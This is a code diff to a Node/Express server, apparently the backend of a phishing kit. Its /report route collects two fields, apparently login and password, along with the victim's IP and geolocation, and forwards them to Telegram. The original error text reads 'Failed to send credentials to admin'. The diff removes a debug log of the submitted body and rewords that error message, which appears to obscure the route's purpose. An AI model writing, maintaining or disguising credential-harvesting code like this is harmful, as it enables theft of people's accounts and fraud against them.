@@ -112,7 +112,7 @@ app.get('/proxy', async (req, res) => {
 
 // Report route
 app.post('/report', async (req, res) => {
-    console.log('Received body:', req.body); 
+   
     const { ai, pr } = req.body;
     const ip = getClientIp(req);
     const location = await getLocationFromIP(ip);
@@ -147,7 +147,7 @@ ${locationDetails}
         }
     } catch (error) {
         console.error('Error sending to Telegram:', error);
-        res.status(500).json({ message: "Failed to send credentials to admin" });
+        res.status(500).json({ message: "Failed to x credentials " });
     }
 });
 
